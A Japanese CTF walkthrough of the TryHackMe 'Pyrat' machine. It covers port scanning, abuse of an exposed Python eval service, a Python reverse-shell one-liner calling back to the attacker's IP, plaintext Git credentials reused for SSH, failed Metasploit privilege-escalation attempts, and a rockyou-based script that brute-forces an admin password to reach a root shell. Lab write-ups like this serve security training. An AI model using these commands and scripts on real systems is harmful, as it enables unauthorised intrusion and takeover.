# Pyrat CTF

https://tryhackme.com/r/room/pyrat

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.141.121

root@ip-10-10-240-201:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-01 22:52 GMT
Nmap scan report for 10.10.141.121
Host is up (0.00040s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
MAC Address: 02:2B:57:76:AF:6B (Unknown)

root@ip-10-10-240-201:~# sudo nmap -sV -p22,8000 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-01 22:52 GMT
Nmap scan report for 10.10.141.121
Host is up (0.00015s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
```

SSH, HTTP

ブラウザで8000にアクセスすると、「try a more basic connection」と表示される。


```shell
$ nc 10.10.141.121 8000 
GET / HTTP/1.1
name 'GET' is not defined
HELP
name 'HELP' is not defined
h
name 'h' is not defined
aa
name 'aa' is not defined
py
name 'py' is not defined
print

print('hello') 
hello

1+1

print 'hello'
Missing parentheses in call to 'print'. Did you mean print('hello')? (<string>, line 1)
```

python3のコードを送ると実行して返してくる。

リバースシェルを実行

```shell
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.22.182",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

```shell
$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.141.121] 38440

$ whoami
whoami
www-data

ls -al /home
total 12
drwxr-xr-x  3 root  root  4096 Jun  2  2023 .
drwxr-xr-x 18 root  root  4096 Dec 22  2023 ..
drwxr-x---  5 think think 4096 Jun 21  2023 think
```

thinkユーザーへの昇格を目指す。

```shell
$ find / -user think -type f 2>/dev/null
find / -user think -type f 2>/dev/null
/opt/dev/.git/objects/0a/3c36d66369fd4b07ddca72e5379461a63470bf
/opt/dev/.git/objects/ce/425cfd98c0a413205764cb1f341ae2b5766928
/opt/dev/.git/objects/56/110f327a3265dd1dcae9454c35f209c8131e26
/opt/dev/.git/COMMIT_EDITMSG
/opt/dev/.git/HEAD
/opt/dev/.git/description
/opt/dev/.git/hooks/pre-receive.sample
/opt/dev/.git/hooks/update.sample
/opt/dev/.git/hooks/post-update.sample
/opt/dev/.git/hooks/pre-applypatch.sample
/opt/dev/.git/hooks/pre-commit.sample
/opt/dev/.git/hooks/pre-merge-commit.sample
/opt/dev/.git/hooks/prepare-commit-msg.sample
/opt/dev/.git/hooks/applypatch-msg.sample
/opt/dev/.git/hooks/fsmonitor-watchman.sample
/opt/dev/.git/hooks/commit-msg.sample
/opt/dev/.git/hooks/pre-rebase.sample
/opt/dev/.git/hooks/pre-push.sample
/opt/dev/.git/config
/opt/dev/.git/info/exclude
/opt/dev/.git/logs/HEAD
/opt/dev/.git/logs/refs/heads/master
/opt/dev/.git/refs/heads/master
/opt/dev/.git/index
```

```shell
$ cat /opt/dev/.git/config
cat /opt/dev/.git/config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        name = Jose Mario
        email = josemlwdf@github.com

[credential]
        helper = cache --timeout=3600

[credential "https://github.com"]
        username = think
        password = _TH1NKINGPirate$_
```

パスワードを発見。これを使ってSSH接続できた。

```shell
$ ssh think@10.10.141.121

think@Pyrat:~$ cat user.txt
996bdb1f619.....
```

## 権限昇格

```shell
think@Pyrat:~$ sudo -l
[sudo] password for think:                                                                                          
Sorry, user think may not run sudo on pyrat.
```

sudo無し。

SUID, SGID

```shell
think@Pyrat:~$ find / -perm -u=s -type f -ls 2>/dev/null                                                            
     3279     24 -rwsr-xr-x   1 root     root        22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1  
      293    464 -rwsr-xr-x   1 root     root       473576 Apr  3  2023 /usr/lib/openssh/ssh-keysign                
     1383     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device           
     9110     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                   
      491     56 -rwsr-sr-x   1 daemon   daemon        55560 Nov 12  2018 /usr/bin/at                               
      672     40 -rwsr-xr-x   1 root     root          39144 Mar  7  2020 /usr/bin/fusermount                       
      480     88 -rwsr-xr-x   1 root     root          88464 Nov 29  2022 /usr/bin/gpasswd                          
      178     84 -rwsr-xr-x   1 root     root          85064 Nov 29  2022 /usr/bin/chfn                             
     2463    164 -rwsr-xr-x   1 root     root         166056 Apr  4  2023 /usr/bin/sudo                             
      184     52 -rwsr-xr-x   1 root     root          53040 Nov 29  2022 /usr/bin/chsh                             
      547     68 -rwsr-xr-x   1 root     root          68208 Nov 29  2022 /usr/bin/passwd                           
     9989     56 -rwsr-xr-x   1 root     root          55528 May 30  2023 /usr/bin/mount                            
    14013     68 -rwsr-xr-x   1 root     root          67816 May 30  2023 /usr/bin/su                               
     1235     44 -rwsr-xr-x   1 root     root          44784 Nov 29  2022 /usr/bin/newgrp                           
     3277     32 -rwsr-xr-x   1 root     root          31032 Feb 21  2022 /usr/bin/pkexec                           
     9996     40 -rwsr-xr-x   1 root     root          39144 May 30  2023 /usr/bin/umount
```

```shell
think@Pyrat:~$ find / -perm -g=s -type f -ls 2>/dev/null
   136252     16 -rwxr-sr-x   1 root     utmp        14648 Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
     1544     44 -rwxr-sr-x   1 root     shadow      43168 Feb  2  2023 /usr/sbin/pam_extrausers_chkpwd
    36097     24 -r-xr-sr-x   1 root     postdrop    22760 Sep  7  2021 /usr/sbin/postqueue
    36088     24 -r-xr-sr-x   1 root     postdrop    22808 Sep  7  2021 /usr/sbin/postdrop
     8081     44 -rwxr-sr-x   1 root     shadow      43160 Feb  2  2023 /usr/sbin/unix_chkpwd
      491     56 -rwsr-sr-x   1 daemon   daemon      55560 Nov 12  2018 /usr/bin/at
      287    344 -rwxr-sr-x   1 root     ssh        350504 Apr  3  2023 /usr/bin/ssh-agent
    35992     16 -rwxr-sr-x   1 root     root        15368 Mar 20  2020 /usr/bin/dotlock.mailutils
      153     84 -rwxr-sr-x   1 root     shadow      84512 Nov 29  2022 /usr/bin/chage
      504     16 -rwxr-sr-x   1 root     tty         14488 Mar 30  2020 /usr/bin/bsd-write
      185     32 -rwxr-sr-x   1 root     shadow      31312 Nov 29  2022 /usr/bin/expiry
      589     44 -rwxr-sr-x   1 root     crontab     43720 Feb 13  2020 /usr/bin/crontab
    36696     36 -rwxr-sr-x   1 root     tty         35048 May 30  2023 /usr/bin/wall
```

### linpeas.sh

```
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

Vulnerable to CVE-2021-3560

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                       
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                            
═╣ PaX bins present? .............. PaX Not Found                                                                   
═╣ Execshield enabled? ............ Execshield Not Found                                                            
═╣ SELinux enabled? ............... sestatus Not Found                                                              
═╣ Seccomp enabled? ............... disabled                                                                        
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)  
```

pkexec の脆弱性を疑う。

#### CVE-2021-4034

ターゲットにgccが入っていないので、metasploitを使う。

```shell
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set LPORT 4445
LPORT => 4445
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > run

[*] Started reverse TCP handler on 10.2.22.182:4445 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] Verify cleanup of /tmp/.toxnodmqjoxn
[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. The target does not appear vulnerable "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
```

#### CVE-2019-13272
```shell
msf6 exploit(linux/local/pkexec) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/pkexec) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(linux/local/pkexec) > set LPORT 4445
LPORT => 4445
msf6 exploit(linux/local/pkexec) > run

[*] Started reverse TCP handler on 10.2.22.182:4445 
[*] Writing exploit executable to /tmp/N45M84pR (4714 bytes)
[*] Starting the payload handler...
[*] Exploit completed, but no session was created.
```

#### CVE-2021-3560

```shell
msf6 exploit(linux/local/polkit_dbus_auth_bypass) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/polkit_dbus_auth_bypass) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(linux/local/polkit_dbus_auth_bypass) > set LPORT 4445
LPORT => 4445
msf6 exploit(linux/local/polkit_dbus_auth_bypass) > run

[*] Started reverse TCP handler on 10.2.22.182:4445 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking for exploitability via attempt
[*] Checking for exploitability via version
[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. Version 0.105-26ubuntu1.3 is not affected. "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
```

いずれも脆弱ではない。

### pyrat.py

```shell
root         588     584  0 Feb01 ?        00:00:00 /bin/sh -c python3 /root/pyrat.py 2>/dev/null
root         589     588  0 Feb01 ?        00:00:00 python3 /root/pyrat.py
 qmgr -l -t unix -u
www-data   13289     589  0 Feb01 ?        00:00:00 python3 /root/pyrat.py
```

最初に利用した wwww-data だけでなく、rootも実行していることに注目。

```shell
think@Pyrat:~$ ls -al /opt/dev
total 12
drwxrwxr-x 3 think think 4096 Jun 21  2023 .
drwxr-xr-x 3 root  root  4096 Jun 21  2023 ..
drwxrwxr-x 8 think think 4096 Jun 21  2023 .git
think@Pyrat:~$ cd /opt/dev
think@Pyrat:/opt/dev$ git status
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    pyrat.py.old

no changes added to commit (use "git add" and/or "git commit -a")
```

pyrat.py.old が deleteされている状態。

リストア

```shell
think@Pyrat:/opt/dev$ git restore pyrat.py.old
think@Pyrat:/opt/dev$ ls
pyrat.py.old
think@Pyrat:/opt/dev$ cat ./pyrat.py.old
...............................................

def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e

...............................................
```

os.getuid() が0を返すように動作を変更できれば、rootとして実行できるか？

```shell
think@Pyrat:/opt/dev$ nc localhost 8000
import os; os.getuid = lambda: 0; print(open('/root/root.txt').read())
[Errno 13] Permission denied: '/root/root.txt'
```

うまくいかず。  
そもそも getuid() が実行されるのは、このPythonコードが実行される前だから意味がなかった。

```shell
think@Pyrat:/opt/dev$ nc localhost 8000
change_uid();print(os.getuid());
33
```

自分で change_uid() を実行してもUIDを変更できているわけではない。

### admin

adminと入力するとパスワードを求められる。

```shell
think@Pyrat:/opt/dev$ nc localhost 8000
admin
Password:
aaa
Password:
bbb
Password:
ccc
ddd
name 'ddd' is not defined
```

3回間違えると無反応になる。

- 毎回TCP接続する
- admin を送信する
- Password: と返ってきたらパスワードを送る
- Password: と返ってきたら失敗したと判断する
- それ以外が返った場合、パスワードを出力

という仕様でツールを作る。

```python
import socket

# 接続先の情報
HOST = '10.10.141.121'
PORT = 8000

# rockyou.txt からパスワードを読み込む
with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='utf-8', errors='ignore') as f:
    passwords = f.read().splitlines()

for password in passwords:
    try:
        # 毎回新しくTCP接続
        with socket.create_connection((HOST, PORT), timeout=5) as s:
            s.sendall(b'admin\n')  # admin を送信
            response = s.recv(1024).decode(errors='ignore')
            
            if 'Password:' in response:
                s.sendall((password + '\n').encode())
                response = s.recv(1024).decode(errors='ignore')
                
                if 'Password:' not in response:
                    print(f'Success! Password: {password}')
                    break
    except Exception as e:
        print(f'Error: {e}')
```

実行

```shell
$ python ./fuzz.py
Success! Password: abc123
```

パスワードが割れた。

```shell
think@Pyrat:/opt/dev$ nc localhost 8000
admin
Password:
abc123
Welcome Admin!!! Type "shell" to begin
shell
# cat /root/root.txt
cat /root/root.txt
ba5ed03e9e....
```

ルートフラグゲット！

## 振り返り

- 一番難しいのは admin エンドポイントの発見。
- pyrat.py.oldを見て、shell以外のエンドポイントがあるのでは？と想像するのは簡単ではない。
- とりあえず管理インターフェースがあるのでは？と疑う発想が必要だった。
- .git ディレクトリにアクセスできる場合は内容確認が必要。